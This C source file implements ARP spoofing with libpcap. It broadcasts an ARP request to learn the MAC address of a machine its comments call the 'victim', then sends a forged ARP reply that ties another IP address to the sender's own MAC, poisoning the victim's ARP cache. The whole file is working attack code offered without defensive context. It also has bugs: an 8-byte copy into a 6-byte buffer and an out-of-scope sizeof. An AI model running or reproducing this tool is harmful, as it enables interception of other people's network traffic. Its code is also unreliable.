#include "my_mac.h"

void make_my_ether_header(struct my_ether_header * my_ether_header,
                          uint8_t* dest, uint8_t * source, uint16_t type);

void make_arp_header(struct my_ether_arp * my_ether_arp,
                     uint8_t *sha, uint32_t spa,
                     uint8_t* tha, uint32_t tpa, uint32_t op);

void strmac_to_buffer(const char* str, uint8_t *mac);

const uint8_t * send_pcap(char * dev,  unsigned char * packet_ptr , int mode);

const uint8_t * know_sender_mac(char * dev, uint8_t *mac);


int main(int argc , char *argv[]){

    unsigned char smac[6] , dmac[6];
    unsigned int sip, dip;
    unsigned char * ptr;
    uint8_t tha[6]=""; // sender's mac storage
    struct arp_packet arp_packet;
    char * check_dev;

    if(argc >2){
        check_dev = argv[1];
    }else{
        printf("you should give us <device><sender ip><target ip>\n");
        return(0);
    }
    if(check_dev == NULL){
        printf("there is no device!\n");
    }

    printf("dev is %s\n",check_dev);

    ptr = (unsigned char *)&arp_packet;
    memset(&arp_packet,0x00,sizeof(arp_packet));

    //since this line, act to know my victim's MAC
    strmac_to_buffer(my_mac(), smac);
    strmac_to_buffer("ff:ff:ff:ff:ff:ff",dmac); // broad cast
    sip = inet_addr(my_ip());// my ip
    dip = inet_addr(argv[2]);// sender ip
    make_my_ether_header(&(arp_packet.my_ether_header),dmac,smac,ETHERTYPE_ARP);
    make_arp_header(&(arp_packet.my_ether_arp),smac,sip,dmac,dip,ARPOP_REQUEST);
    /*
    printf("your packet : \n");
    for(int i=0 ; i < sizeof(arp_packet); i++){
        printf("%02x%c",ptr[i],((i+1)%16!=0)?' ':'\n');
    }
    */
    printf("\n");
    memcpy(tha, send_pcap(check_dev, ptr , 1),8); // send arp who has sender ip to figure out sender's mac third argument is determine get reply
    for(int i=0 ; i<6 ; i++){
        printf("%x",tha[i]);
    }
    //=======================================================

    // know_sender_mac(check_dev , tha);
    //=======================================================

    sip = inet_addr(argv[3]);
    //strmac_to_buffer("ff:ff:ff:ff:ff:ff",dmac);
    make_my_ether_header(&(arp_packet.my_ether_header),tha,smac,ETHERTYPE_ARP);
    make_arp_header(&(arp_packet.my_ether_arp),smac,sip,tha,dip,ARPOP_REPLY);
    printf("your packet : \n");
    for(int i=0 ; i < sizeof(arp_packet); i++){
        printf("%02x%c",ptr[i],((i+1)%16!=0)?' ':'\n');
    }
    send_pcap(check_dev, ptr, 0);
}

void make_my_ether_header(struct my_ether_header * my_ether_header,
                          uint8_t* dest, uint8_t * source, uint16_t type){
    memcpy(my_ether_header->ether_dhost,dest,ETH_ALEN);
    memcpy(my_ether_header->ether_shost,source,ETH_ALEN);

    my_ether_header->ether_type = htons(type);
}

void make_arp_header(struct my_ether_arp * my_ether_arp,
                     uint8_t *sha, uint32_t spa,
                     uint8_t* tha, uint32_t tpa, uint32_t op){
    my_ether_arp->arp_hrd = ntohs(1);
    my_ether_arp->arp_pro = ntohs(ETHERTYPE_IP);
    my_ether_arp->arp_hln = 6;
    my_ether_arp->arp_pln = 4;

    my_ether_arp->arp_op = htons(op);

    memcpy(my_ether_arp->arp_sha,sha,6);
    memcpy(my_ether_arp->arp_spa,&spa,4);

    (tha)?
                (memcpy(my_ether_arp->arp_tha,tha,6)):
                (memset(my_ether_arp->arp_tha,0x00,6));

    memcpy(my_ether_arp->arp_tpa,&tpa,4);
}

void strmac_to_buffer(const char* str, uint8_t *mac){
    unsigned int tmac[ETH_ALEN];

    sscanf(str,"%x:%x:%x:%x:%x:%x",
           &tmac[0],&tmac[1],&tmac[2],&tmac[3],&tmac[4],&tmac[5]);

    for(int i=0 ; i < 6 ; i++){
        mac[i] = (unsigned char)tmac[i];
    }

}

const uint8_t * send_pcap(char * dev, unsigned char * packet_ptr, int mode)
{
    pcap_t *handle;			/* Session handle */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    struct pcap_pkthdr *header;	/* The header that pcap gives us */
    const u_char *packet;
    const struct sniff_ethernet * ethernet;
    const struct my_ether_arp * ether_arp;

    /* Define the device */
    handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);

    if(pcap_sendpacket(handle,packet_ptr,sizeof(arp_packet))!=0){
        printf("failed sending!\n");
    }else{
        printf("sended! \n");
    }

    if(mode == 1){
        int i = 0;
        while(1){
            i = pcap_next_ex(handle, &header, &packet);
            printf("Jacked a packet with length of [%d]\n" , header->len);
            if(i==1){
                ethernet = (const struct sniff_ethernet*)(packet);
                if(ntohs(ethernet->ether_type) == ETHERTYPE_ARP){
                    printf("this is ARP \n");
                    ether_arp = (struct my_ether_arp*)(packet+14);
                    for(int i=0 ; i < header->len; i++){
                        printf("%02x%c",packet[i],((i+1)%16!=0)?' ':'\n');
                    }
                    printf("\n");
                    printf("%x\n",ntohs(ether_arp->ea_hdr.ar_op));
                    if(ntohs(ether_arp->ea_hdr.ar_op)==ARPOP_REPLY){
                        printf("ARP Reply\n");
                        return ether_arp->arp_sha;
                    }
                }
            }
        }
    }
    pcap_close(handle);
    return(0);
}

